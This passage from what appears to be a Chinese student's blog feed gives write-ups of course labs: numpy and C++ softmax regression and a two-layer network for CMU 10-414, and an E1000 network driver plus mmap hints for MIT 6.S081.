class="hljs-keyword">as</span> f:<br>        data = np.frombuffer(f.read(), dtype=np.uint8, offset=<span class="hljs-number">16</span>)<br>    data=data.reshape(-<span class="hljs-number">1</span>,<span class="hljs-number">28</span>*<span class="hljs-number">28</span>)<br>    data=data.astype(<span class="hljs-string">&#x27;float32&#x27;</span>)<br>    <span class="hljs-keyword">with</span> gzip.<span class="hljs-built_in">open</span>(label_filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        label = np.frombuffer(f.read(), dtype=np.uint8, offset=<span class="hljs-number">8</span>)<br>    <span class="hljs-comment"># 归一化,就是简单的映射</span><br>    data=data/<span class="hljs-number">255</span><br>    <span class="hljs-keyword">return</span> data,label<br></code></pre></td></tr></table></figure><h1 id="softmax-loss"><a href="#softmax-loss" class="headerlink" title="softmax_loss"></a>softmax_loss</h1><p>使用numpy实现softmax交叉熵损失，关键在于numpy的并行化操作，广播特性，操作轴axis等</p><p>这是一维输入时的公式，其中每个$z_i$都是这个样本标签为i的概率<br>$$<br>\begin{equation}</p><p>\ell_{\mathrm{softmax}}(z, y) &#x3D; \log\sum_{i&#x3D;1}^k \exp z_i - z_y.</p><p>\end{equation}<br>$$<br>实现要求的是二维输入的情况，思路如下</p><ol><li>对整个二维数组求exp指数</li><li>按行对指数结果求和</li><li>对求和的结果取对数</li><li>每个样本都要减去对应的$z_i$</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax_loss</span>(<span class="hljs-params">Z, y</span>):<br>    exp_Z = np.exp(Z)<br>    exp_S = np.<span class="hljs-built_in">sum</span>(exp_Z,axis=<span class="hljs-number">1</span>)<br>    exp_L = np.log(exp_S)<br>    y_Z = Z[np.arange(Z.shape[<span class="hljs-number">0</span>]),y]<br>    <span class="hljs-keyword">return</span> np.mean(exp_L-y_Z)<br></code></pre></td></tr></table></figure><h1 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h1><p>更新公式<br>$$<br>\theta:&#x3D;\theta-\frac\alpha BX^T(Z-I_y)<br>$$<br>其中$Z&#x3D;\operatorname{softmax}(X\theta)$</p><p>而$softmax$操作就是对每一行normalize，即对每个标签i来说<br>$$<br>\begin{aligned}-1{i&#x3D;y}+\frac{\exp h_i}{\sum_{j&#x3D;1}^k\exp h_j}\end{aligned}<br>$$<br>而$I_y$是生成一个one_hot向量，只有y处为1</p><p>具体实现如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">normalize_</span><span class="hljs-params">(x)</span>:</span><br><span class="hljs-function">    ex=</span>np.<span class="hljs-built_in">exp</span>(x)<br>    ex_rowsum=ex.<span class="hljs-built_in">sum</span>(axis=<span class="hljs-number">1</span>)<br>    ex_n=ex/ex_rowsum[:,np.newaxis]<br>    <span class="hljs-keyword">return</span> ex_n<br>def <span class="hljs-built_in">gethot</span>(y,n):<br>    one_hot=np.<span class="hljs-built_in">eye</span>(n)[y]<br>    <span class="hljs-keyword">return</span> one_hot<br><br>def <span class="hljs-built_in">softmax_regression_epoch</span>(X, y, theta, lr = <span class="hljs-number">0.1</span>, batch=<span class="hljs-number">100</span>):<br>    batch_num = X.shape[<span class="hljs-number">0</span>] <span class="hljs-comment">// batch</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(batch_num):<br>        x_d = X[i*batch:(i+<span class="hljs-number">1</span>)*batch] <span class="hljs-comment">// m*n</span><br>        y_d = y[i*batch:(i+<span class="hljs-number">1</span>)*batch] <span class="hljs-comment">// m</span><br>        o = np.<span class="hljs-built_in">dot</span>(x_d,theta) <span class="hljs-comment">// m*k</span><br>        z = <span class="hljs-built_in">normalize_</span>(o) <span class="hljs-comment">// m*k</span><br>        oh = <span class="hljs-built_in">gethot</span>(y_d,theta.shape[<span class="hljs-number">1</span>]) <span class="hljs-comment">// m*k</span><br>        <span class="hljs-meta"># print(x_d.T.shape,z.shape,oh.shape)</span><br>        theta-=lr/batch*(np.<span class="hljs-built_in">dot</span>(x_d.T,z-oh))<br></code></pre></td></tr></table></figure><h1 id="nn-epoch"><a href="#nn-epoch" class="headerlink" title="nn_epoch"></a>nn_epoch</h1><p>和上题一样，翻译公式即可</p><p>$W_2$的梯度<br>$$<br>\begin{aligned}\nabla_{W_2}\ell_{ce}(\sigma(XW_1)W_2,y)&amp;&#x3D;\sigma(XW_1)^T(S-I_y)\end{aligned}<br>$$<br>$W_1$的梯度<br>$$<br>\nabla_{W_1}\ell_{ce}(\sigma(XW_1)W_2,y)&#x3D;X^T\left((S-I_y)W_2^T\circ\sigma^{\prime}(XW_1)\right)<br>$$<br>其中$S$为<br>$$<br>S&#x3D;\text{ softmax}(\sigma(XW_1)W_2)<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">active</span><span class="hljs-params">(x)</span>:</span><br><span class="hljs-function">    return np.maximum(<span class="hljs-number">0</span>,x)</span><br><span class="hljs-function">def deactivate(x):</span><br><span class="hljs-function">    return np.where(x&lt;=</span><span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br><span class="hljs-function">def <span class="hljs-title">nn_epoch</span><span class="hljs-params">(X, y, W1, W2, lr = <span class="hljs-number">0.1</span>, batch=<span class="hljs-number">100</span>)</span>:</span><br><span class="hljs-function">    ### BEGIN YOUR CODE</span><br><span class="hljs-function">    batch_num =</span> X.shape[<span class="hljs-number">0</span>] <span class="hljs-comment">// batch</span><br>    <span class="hljs-function"><span class="hljs-keyword">for</span> i in <span class="hljs-title">range</span><span class="hljs-params">(batch_num)</span>:</span><br><span class="hljs-function">        x_d =</span> X[i*batch:(i+<span class="hljs-number">1</span>)*batch]<br>        y_d = y[i*batch:(i+<span class="hljs-number">1</span>)*batch]<br>        x_w1 = np.<span class="hljs-built_in">dot</span>(x_d,W1)<br>        th_x_w1 = <span class="hljs-built_in">active</span>(x_w1)<br>        o = np.<span class="hljs-built_in">dot</span>(th_x_w1,W2)<br>        s = <span class="hljs-built_in">normalize_</span>(o)<br>        iy = <span class="hljs-built_in">gethot</span>(y_d,W2.shape[<span class="hljs-number">1</span>])<br>        d_w2 = np.<span class="hljs-built_in">dot</span>(<span class="hljs-built_in">active</span>(x_w1).T,s-iy)<br>        d_w1 = np.<span class="hljs-built_in">dot</span>(x_d.T,np.<span class="hljs-built_in">multiply</span>(np.<span class="hljs-built_in">dot</span>(s-iy,W2.T),<span class="hljs-built_in">deactivate</span>(x_w1)))<br>        W2-=lr/batch*d_w2<br>        W1-=lr/batch*d_w1<br></code></pre></td></tr></table></figure><h2 id="softmax-regression-epoch-cpp"><a href="#softmax-regression-epoch-cpp" class="headerlink" title="softmax_regression_epoch_cpp"></a>softmax_regression_epoch_cpp</h2><p>一行一行翻译python代码就行了，关键在于矩阵操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">matMul</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">float</span> *x, <span class="hljs-type">float</span> *theta, <span class="hljs-type">float</span> *o, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; k; j++) &#123;<br>            o[i * k + j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> t = <span class="hljs-number">0</span>; t &lt; n; t++) &#123;<br>                <span class="hljs-comment">// x: i t   theta: t j   o:i j</span><br>                <span class="hljs-comment">// x: m n   theta: n k   o:m k</span><br>                o[i * k + j] += x[i * n + t] * theta[t * k + j];<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sigmoid</span><span class="hljs-params">(<span class="hljs-type">float</span> *mat, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-type">float</span> temp = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; k; j++) &#123;<br>            mat[i * k + j] = std::<span class="hljs-built_in">exp</span>(mat[i * k + j]);<br>            temp += mat[i * k + j];<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; k; j++) &#123;<br>            mat[i * k + j] /= temp;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hotDeal</span><span class="hljs-params">(<span class="hljs-type">float</span> *mat, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> k, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *y)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-type">char</span> label = y[i];<br>        mat[i * k + label] -= <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// x:m*n  o:m*k</span><br><span class="hljs-comment">// x的转置n*m o:m*k</span><br><span class="hljs-comment">// dg n*k</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">calDg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">float</span> *x, <span class="hljs-type">float</span> *o, <span class="hljs-type">float</span> *dg, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; k; j++) &#123;<br>            <span class="hljs-type">int</span> index = i * k + j;<br>            dg[index] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> t = <span class="hljs-number">0</span>; t &lt; m; t++) &#123;<br>                dg[index] += x[t * n + i] * o[t * k + j];<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">updateTheta</span><span class="hljs-params">(<span class="hljs-type">float</span> *theta, <span class="hljs-type">float</span> *dg, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k, <span class="hljs-type">float</span> lr, <span class="hljs-type">float</span> batch)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; k; j++) &#123;<br>            theta[i * k + j] -= lr / batch * dg[i * k + j];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">softmax_regression_epoch_cpp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">float</span> *X, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *y,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-type">float</span> *theta, <span class="hljs-type">size_t</span> m, <span class="hljs-type">size_t</span> n, <span class="hljs-type">size_t</span> k,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-type">float</span> lr, <span class="hljs-type">size_t</span> batch)</span> </span>&#123;<br>    <span class="hljs-type">int</span> batch_num = m / batch;<br>    <span class="hljs-type">float</span> *o = (<span class="hljs-type">float</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>) * m * k);<br>    <span class="hljs-type">float</span> *dg = (<span class="hljs-type">float</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>) * n * k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; batch_num; i++) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">float</span> *x_d = X + n * batch * i;<br>        <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *y_d = y + batch * i;<br>        <span class="hljs-built_in">matMul</span>(x_d, theta, o, batch, n, k);<br>        <span class="hljs-built_in">sigmoid</span>(o, batch, k);<br>        <span class="hljs-built_in">hotDeal</span>(o, batch, k, y_d);<br>        <span class="hljs-comment">// theta-=lr/batch*(np.dot(x_d.T,z-oh))</span><br>        <span class="hljs-comment">// theta-=lr/batch*(x_d.T,o)</span><br>        <span class="hljs-built_in">calDg</span>(x_d, o, dg, batch, n, k);<br>        <span class="hljs-built_in">updateTheta</span>(theta, dg, n, k, lr, batch);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习框架</category>
      
      <category>CMU10414</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习框架</tag>
      
      <tag>CMU10414</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab11</title>
    <link href="/2023/08/31/6-s081-lab11/"/>
    <url>/2023/08/31/6-s081-lab11/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204913.png" alt="20231224204913"></p><h1 id="background"><a href="#background" class="headerlink" title="background"></a>background</h1><ol><li>在开始写代码之前，回顾一下xv6book的第五章会有帮助</li><li>你将使用E1000去处理网络通信<ol><li>E1000会和qemu模拟的lan通信</li><li>在qemu模拟的lan中<ol><li>xv6的地址是10.0.2.15</li><li>qemu模拟的计算机的地址是10.0.2.2</li></ol></li></ol></li><li>qemu会将所有的网络包都记录在<code>packets.pcap</code>中</li><li>文件<code>kernel/e1000.c</code>包含了E1000的初始化代码，以及你需要补充的接收和发送的空函数</li><li><code>kernel/e1000_dev.h</code>包含了寄存器和标志位的定义</li><li><code>kernel/net.c</code>和<code>kernel/net.h</code>包含了一个简单的内核栈去实现IP,UDP,ARP协议。这些文件也包含了一个灵活的数据结构去持有packet，叫作mbuf</li></ol><h1 id="your-job"><a href="#your-job" class="headerlink" title="your job"></a>your job</h1><ol><li>完成<code>kernel/e1000.c</code>中的<code>e1000_transmit()</code>和<code>e1000_recv()</code></li></ol><p>简单捋一下实验的思路</p><ol><li>首先，我们要修改的是设备驱动，也就是内核层面的代码，它会和硬件设备协同完成数据包的发送和接受</li><li>发送数据包时<ol><li>内核只需要将已经准备好的mbuf放到一个缓冲数组中，就完事了。这就是缓冲数组的优点，我往里面一扔就行了</li><li>网卡中应该也有固定的程序，它会自己讲缓冲数组的数据包给发送出去</li><li>我们只需要完成1中的任务，网卡那边不需要我们管</li></ol></li><li>接受数据包时<ol><li>当网卡接收了数据时，它会将它存入另一个缓冲数组，存好之后它们通过一个中断，告诉内核来收数据了</li><li>内核只需要将这个缓冲数组中已经到达的数据包传递给上层应用即可</li></ol></li></ol><p>以上就是基本的交互框架，但是因为设备驱动是内核，是纯软件，而网卡设备是硬件，所以双方的交互就有点麻烦。这里通过了一个很神奇的操作，就是寄存器映射，将硬件的寄存器给映射到了内核的地址空间中，我们访问内核的某个地址，就是在访问硬件的寄存器，这一下子就打通了内核和硬件之间的桥梁</p><p>在<code>e1000_init</code>中，就将寄存器映射的起始地址赋值给了<code>regs</code>，并且将各种信息和地址都存放到寄存器中，比如数组<code>tx_ring</code>的地址就放到了<code>regs[E1000_TDBAL] = (uint64)tx_ring;</code></p><p>至此，准备工作就做完了，我们现在就需要增加内核代码，使其能够和网卡配合，完成数据报的发送和接受</p><h2 id="hints：e1000-transmit"><a href="#hints：e1000-transmit" class="headerlink" title="hints：e1000_transmit"></a>hints：e1000_transmit</h2><p>这个lab很有意思，它的hints基本就是给了你所有的伪代码，你一个一个去实现就行了</p><ol><li>首先，让我们通过<code>E1000_TDT</code>为索引去regs取出当前的index，其中regs就是一个<code>uint</code>类型的数组的头指针</li><li>判断这个index指向的buf的状态，通过这个index去<code>tx_ring</code>中取出des，状态就存于des里的status中。这里要和一个宏E1000_TXD_STAT_DD相与进行判断</li><li>如果这个buf还存着之前的值，将它通过<code>mbuffree</code>给free掉</li><li>按提示修改des的各种参数，并且当前buf修改为传入的参数m即可。其中des的cmd参数没有给出提示，估计是想让我们自己查手册，我直接抄了大佬的E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS</li><li>最后，更新寄存器的值（空闲buf的指针，也就是第1步取出来东西的那个寄存器）</li></ol><p>这里有个注意点就是，需要在函数首尾加锁。因为同一时刻，可能有多个进程想要通过网卡发送数据，这就形成了竞争的问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">e1000_transmit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m)</span> &#123;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// the mbuf contains an ethernet frame; program it into</span><br>    <span class="hljs-comment">// the TX descriptor ring so that the e1000 sends it. Stash</span><br>    <span class="hljs-comment">// a pointer so that it can be freed after sending.</span><br>    <span class="hljs-comment">//</span><br>    acquire(&amp;e1000_lock);<br><br>    uint32 index = regs[E1000_TDT];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tx_desc</span> *<span class="hljs-title">des</span> =</span> &amp;tx_ring[index];<br><br>    <span class="hljs-keyword">if</span> (!(des-&gt;status &amp; E1000_TXD_STAT_DD)) &#123;<br>        release(&amp;e1000_lock);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (tx_mbufs[index]) &#123;<br>        mbuffree(tx_mbufs[index]);<br>    &#125;<br><br>    des-&gt;addr = (uint64)m-&gt;head;<br>    des-&gt;length = m-&gt;len;<br>    des-&gt;cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS;<br>    tx_mbufs[index] = m;<br><br>    regs[E1000_TDT] = (regs[E1000_TDT] + <span class="hljs-number">1</span>) % TX_RING_SIZE;<br><br>    release(&amp;e1000_lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="hints：e1000-recv"><a href="#hints：e1000-recv" class="headerlink" title="hints：e1000_recv"></a>hints：e1000_recv</h2><ol><li>首先通过寄存器中<code>E1000_RDT</code>的值+1对RX_RING_SIZE取模获取待接收数据的索引</li><li>判断这个索引指向的buf的状态是否是待接收</li><li>如果是待接收，修改m-&gt;len并且通过<code>net_rx</code>将这个buf传递给上层</li><li>通过mbufalloc在这个索引处再次新建一个buf，并且将这个buf的des的data指针指向这个buf的head，然后将状态设置为0</li><li>最后将这个索引的寄存器的值+1,</li></ol><p>这里有两个注意点</p><ol><li>不需要加锁，因为这里给出了提示。如果这个函数没有运行完，那么不会产生另一个中断</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">e1000_intr</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-comment">// tell the e1000 we&#x27;ve seen this interrupt;</span><br>    <span class="hljs-comment">// without this the e1000 won&#x27;t raise any</span><br>    <span class="hljs-comment">// further interrupts.</span><br>    regs[E1000_ICR] = <span class="hljs-number">0xffffffff</span>;<br><br>    e1000_recv();<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>需要使用while循环，把能读的数据包都读出来。我猜是因为一次中断不一定代表只有一个数据包到了，甚至在处理中断的过程中，还会有数据包到。如果每次中断只读一个，会导致丢很多包</li></ol>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab10</title>
    <link href="/2023/08/30/6-s081-lab10/"/>
    <url>/2023/08/30/6-s081-lab10/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204848.png" alt="20231224204848"></p><h1 id="task"><a href="#task" class="headerlink" title="task"></a>task</h1><hr><p>mmap的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">           <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><ol><li><p>在这个lab中，addr永远为0，即内核决定用哪个虚拟地址去映射这个文件，mmap返回这个虚拟地址，或者0xffffffffffffffff 表示失败</p></li><li><p>length代表映射的字节数量，不一定要是文件的长度</p></li><li><p>prot决定了这个内存，可读，可写或者可执行</p><p> 具体的宏为PROT_READ、PROT_WRITE</p></li><li><p>flags如果是MAP_SHARED，意味着对内存的修改要写回到文件</p><p> MAP_PRIVATE意味着不用写回文件</p></li><li><p>fd是文件的描述符，你可以假设offset是0</p></li></ol><hr><p>munmap的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">munmap(addr, length)<br></code></pre></td></tr></table></figure><ol><li>munmap应该移出这些地址范围内的映射</li><li>如果进程修改了内存，并且映射方式是MAP_SHARED，那么修改应该被写回文件</li><li>munmap可能只覆盖了mmap的一部分区间，可以是开始，可以是末尾，也可能是整个，但不会是中间位置</li></ol><h1 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h1><ol><li><p>首先在Makefile中添加_mmaptest，并且增加mmap和munmap系统调用</p><p> 在<code>kernel/fcntl.h</code>为你定义了<code>PROT_READ</code>等参数</p></li><li><p>lazy地对待页表，类似于lazy lab。</p><p> 即mmap并不会直接分配物理内存和读文件，在usertrap中处理页错误时再真正的分配内存</p></li><li><p>你需要记录每个进程通过mmap映射了什么</p><p> 你可以定义一个和VMA相关的数据结构，去记录地址，长度，权限，文件等</p><p> 你可以定义一个固定长度的VMA数组，16就足够了</p></li><li><p>实现mmap</p><ol><li><p>在进程的地址空间找一块未使用的区域去映射文件</p></li><li><p>并且增加一个VMA到进程映射区域的表中</p><ol><li>VMA应该包含一个指向<code>struct file</code>的指针。mmap应该增加这个文件的引用，这一部分可以参考<code>filedup</code></li></ol></li><li><p>这时候运行mmaptest，可以发现第一个成功了，但是后面的还是失败了</p></li></ol></li><li><p>增加代码</p><ol><li>在页错误发生在mapped区域时，分配一个物理页面，从相关的文件中读取4096个字节，并且将其映射到用户地址空间</li><li>用readi读取文件，它会使用到一个offset参数，同时你需要将inode结点给lock和unlock</li><li>不要忘记设置这一页的权限位</li><li>运行mmaptest，这时候会运行到munmap了</li></ol></li><li><p>实现munmap</p><ol><li>找到这个地址范围内的VMA，unmap指定的页面，使用<code>uvmunmap</code></li><li>如果munmap删除了mmap分配的所有区域，那它应该减少文件的引用次数</li><li>如果一个页面是MAP_SHARED，并且被修改了，那么应该写回文件（学习<code>filewrite</code>）。写回时不需要管pte的dirty位</li></ol></li><li><p>修改exit函数，使其能够在进程用过mmap的情况下，将没有被munmap都处理掉，至此mmap_test可能可以通过了</p></li><li><p>修改fork保证孩子也有和父节点一样的映射区域，不要忘记了去给VMA文件增加引用数。在页错误发生时，可以分配一个新的物理页面，而不是和父进程共享一个。</p></li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h2><p>首先需要修改Makefile并且添加两个系统调用，这个就比较简单了</p><h2 id="增加数据结构"><a href="#增加数据结构" class="headerlink" title="增加数据结构"></a>增加数据结构</h2><p>我们应该按照hints提示的，创造一个VMA的结构体，并且在进程的proc的结构体中存储一个VMA的数组。这里的思路就比较简单暴力了，就只维护一个数组，需要用的时候就遍历数组去找就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> &#123;</span><br>    uint64 addr;<br>    <span class="hljs-type">int</span> length;<br>    <span class="hljs-type">int</span> prot;<br>    <span class="hljs-type">int</span> flag;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">int</span> valid;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> <span class="hljs-title">vmas</span>[16];</span><br>    <span class="hljs-comment">//.......</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sys-mmap"><a href="#sys-mmap" class="headerlink" 